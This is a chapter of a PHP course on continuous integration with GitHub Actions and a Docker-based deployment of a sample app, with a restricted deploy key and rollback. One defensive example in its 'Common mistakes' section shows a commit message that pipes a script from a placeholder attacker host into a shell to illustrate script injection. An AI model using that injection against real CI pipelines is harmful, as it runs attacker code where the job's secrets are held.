# 79. CI and a simple deployment

## Goals

- You will be able to run every check of a project on every push: tests, static analysis, code style.
- You will be able to build release images in CI, named after their commit, and push them to a registry.
- You will be able to deploy a commit to a server with a key that can do nothing else.
- You will be able to check a deploy with a smoke test, and go back to the version before.

## Before you start

- Chapters 39 to 42: PHP-CS-Fixer, PHPStan and PHPUnit.
- Chapter 43: Git.
- Chapter 77: *Shelf*'s tests.
- Chapter 78: *Shelf*'s production image.

## The idea

So far, every check ran when someone remembered to run it. **Continuous integration** (CI) runs them on a computer of its own, on every push and every pull request, from a fresh checkout: a change that breaks a test is red before anyone merges it. A **pipeline** is a list of **jobs**, and a job a list of **steps**; each step is a command, and its **exit status** decides: `0` is success, anything else a failure, and the job stops there.

*Shelf* uses **GitHub Actions**: a workflow is a YAML file in `.github/workflows/`, and GitHub runs it on its own machines (**runners**). Other CI services work the same way, with their own file format.

**Continuous deployment** goes one step further: when the checks pass on `main`, the new version goes to the server on its own. For *Shelf*, that is four steps:

1. **Check** in the image itself: the Dockerfile gets a `test` stage, with the tools, that runs every check. CI builds that stage, so the tests run with the PHP and the extensions of production.
2. **Build and push** the images, named after the commit: `ghcr.io/owner/shelf-app:8f3c2e1…`. A **registry** keeps images, as Packagist keeps packages; GitHub's, `ghcr.io`, comes with the repository. A name per commit says exactly which version runs, and the one before stays there.
3. **Deploy:** CI logs into the server over SSH and runs `deploy.sh` with the commit. The server pulls the images, and starts new containers; the migrations run before PHP-FPM starts.
4. **Smoke test:** a few requests to the live site. If one fails, someone looks at once, and running `deploy.sh` with the commit before brings the old version back.

The server needs only Docker, Compose, `compose.prod.yaml`, its own `.env` with the secret, and `deploy.sh`. It never builds anything, and never sees the source.

## In code

### How CI decides

<!-- include: code/79-ci-and-deployment/status.php -->

<!-- include: code/79-ci-and-deployment/status.out -->

- Static analysis fails with `1`: the job stops, and the code style isn't even checked.
- `exit("text")` prints the text and ends with status `0`, a success. A script that stops because something went wrong must end with a status other than `0`, or CI passes. *Shelf*'s CI found exactly this bug in its own test setup, below.

## Common mistakes

### A deploy job that trusts too much

<!-- include: code/79-ci-and-deployment/ci.bad.yml -->

✗ Three problems:

- Without `needs: checks`, the deploy runs next to the checks, not after them: a broken commit goes live.
- `${{ ... }}` is pasted into the script before it runs. A commit message with `$(curl evil.example | sh)` in it runs on the runner, with the job's secrets. This is called **script injection**.
- The server's root password is printed into the log, and it can do anything on the server, forever. GitHub hides secrets it knows in its logs, but not every form of them.

**Fix:** `needs:`; every value from GitHub through `env:`, so the script reads a variable instead of running code; and a key per purpose, which may run one command only, as *Shelf*'s deploy does.

### Checking only on the main branch

Checks that run only after a merge show the problem when it is already in `main`, and in production a minute later.

**Fix:** checks on every push and every pull request; deploy only from `main`, only after the checks.

### A tag that moves

`shelf-app:latest` on the server: which version is that? After a deploy, `latest` points to the new image, and the old one has no name to go back to.

**Fix:** a tag per commit. The server runs `shelf-app:8f3c2e1…`, and going back is a deploy of the commit before.

## Principle check

**KISS:** one workflow file, one shell script on the server, the registry that comes with the repository; no deployment tool to learn. **DRY:** the Dockerfile is the one description of the environment: CI's checks, production and your computer use it. **Secure by default:** pinned actions, read-only permissions unless a job needs more, values through `env:`, and a deploy key that can run only `deploy.sh` with a commit hash.

## Security

- **Least privilege for CI.** `permissions: contents: read` for everything; only the deploy job may write packages. Actions are pinned to a commit, not a tag that could be moved to other code.
- **A key that can do one thing.** In `~/.ssh/authorized_keys`, `command="…/deploy.sh",restrict` makes the key run `deploy.sh` and nothing else, whatever the client asks; `deploy.sh` accepts only a 40-digit commit hash. If the key leaks, the worst it can do is deploy a version that is already in the registry.
- **A known server.** `known_hosts` comes from a secret that you checked once, so CI never talks to a server that only claims to be yours.
- **Docker is root.** A user who may run `docker` can become root on the server. Give that right only to the `deploy` user, and that user's key only to CI.
- **Secrets in GitHub's environment settings,** never in the repository: an environment can also require a person's approval before each deploy.

## Shelf

*Shelf* gets its own check tools, a test stage, a workflow and a deploy script: everything it needs as a repository of its own. In the course's repository, the workflow in `.github/workflows/ci.yml` builds *Shelf*'s test stage, starts its production containers on the runner, and sends the smoke test's requests, on every push.

### Its own checks

```
cd shelf
composer require --dev phpunit/phpunit phpstan/phpstan friendsofphp/php-cs-fixer
```

`composer check` runs the three, `shelf/composer.json`:

<!-- include: code/79-ci-and-deployment/shelf/composer.json -->

The code style, as the course checks it, `shelf/.php-cs-fixer.dist.php`:

<!-- include: code/79-ci-and-deployment/shelf/.php-cs-fixer.dist.php -->

PHPUnit's schema is now *Shelf*'s own, `shelf/phpunit.xml.dist`:

<!-- include: code/79-ci-and-deployment/shelf/phpunit.xml.dist -->

PHPUnit's recipe added a few lines to `.gitignore`; *Shelf* keeps the one it didn't have, `shelf/.gitignore`:

<!-- include: code/79-ci-and-deployment/shelf/.gitignore -->

### What the first run found

The test stage, in a fresh checkout as CI has it, soon passed: PHPStan and the code style had run, but not a single test. The test database's migration had failed, because a fresh checkout has no `var/log/` for Symfony's test log; and `tests/bootstrap.php` (chapter 77) reported it with `exit("...")`, which ends with status `0`. Both are fixed, `shelf/tests/bootstrap.php`:

<!-- include: code/79-ci-and-deployment/shelf/tests/bootstrap.php -->

### The test stage

`shelf/Dockerfile`:

<!-- include: code/79-ci-and-deployment/shelf/Dockerfile -->

- **`base`** adds `mbstring`, which PHPUnit needs. *Shelf*'s own `mb_` functions ran on Symfony's polyfill without it in chapter 78: slower, but they worked.
- **`test`** installs the tools on top of `build`, and runs `composer check`. If a check fails, the image isn't built, and CI is red.
- **`release`** removes the tests and the tools' settings, and `app` and `web` take everything from it.

The tests go into the build now, so `.dockerignore` keeps them, `shelf/.dockerignore`:

<!-- include: code/79-ci-and-deployment/shelf/.dockerignore -->

### The workflow

`shelf/.github/workflows/ci.yml`:

<!-- include: code/79-ci-and-deployment/shelf/.github/workflows/ci.yml -->

- `checks` runs on every push and pull request; `deploy` only after it, and only for `main`.
- `environment: production` holds the deploy's secrets, apart from everything else.
- `concurrency` lets one deploy finish before the next starts.
- The registry wants names in lower case; `tr` makes them so.

### On the server

The images get names from the registry and the commit, `shelf/compose.prod.yaml`:

<!-- include: code/79-ci-and-deployment/shelf/compose.prod.yaml -->

`shelf/deploy/deploy.sh`:

<!-- include: code/79-ci-and-deployment/shelf/deploy/deploy.sh -->

Set up a server once:

1. Install Docker and its Compose plugin; make a user `deploy` in the `docker` group.
2. In `/home/deploy/shelf/`, put `compose.prod.yaml`, `deploy.sh`, and a `.env` with `SHELF_IMAGE=ghcr.io/owner/shelf`, `SHELF_HOST` and `SHELF_APP_SECRET` (`chmod 600 .env`). If the images aren't public, `docker login ghcr.io` once, with a token that may only read packages.
3. Make a key pair for CI: `ssh-keygen -t ed25519 -f shelf-ci`. Its public half goes into `~/.ssh/authorized_keys` of `deploy`, with `command="/home/deploy/shelf/deploy.sh",restrict` before it; its private half into the secret `DEPLOY_SSH_KEY`.
4. Point the domain to the server, and open ports 80 and 443.

From then on, every push to `main` that passes the checks is online a few minutes later. To go back, run `deploy.sh` with the commit before.

## Exercises

The exercises are in `exercises/79-ci-and-deployment/`. Check your work with:

```
composer exercise 79 beginner
```

1. **Beginner, `images.php`:** the name of an image for the registry, from the repository, the stage and the commit, refusing every value that isn't one.
2. **Intermediate, `smoke.php`:** the smoke test after a deploy: the status and the headers of a few pages, every problem named.
3. **Advanced, `migrations.php`:** find the statements in a migration that remove or rename data, before a deploy runs them on its own, without being fooled by strings and comments.

## Summary

- CI runs every check on every push and pull request, from a fresh checkout; each step's exit status decides.
- The checks run in the production image's own test stage.
- Images are named after their commit, pushed to a registry, and pulled by the server, which builds nothing.
- The deploy key can run one script with a commit hash, and nothing else.
- A smoke test checks the live site; going back is a deploy of the commit before.

## Further reading

- GitHub documentation, Understanding GitHub Actions: https://docs.github.com/en/actions/get-started/understand-github-actions
- GitHub documentation, Secure use reference: https://docs.github.com/en/actions/reference/security/secure-use
- GitHub documentation, Working with the Container registry: https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry
- Docker documentation, Compose in production: https://docs.docker.com/compose/how-tos/production/
- OpenSSH manual, sshd authorized_keys format: https://man.openbsd.org/sshd#AUTHORIZED_KEYS_FILE_FORMAT
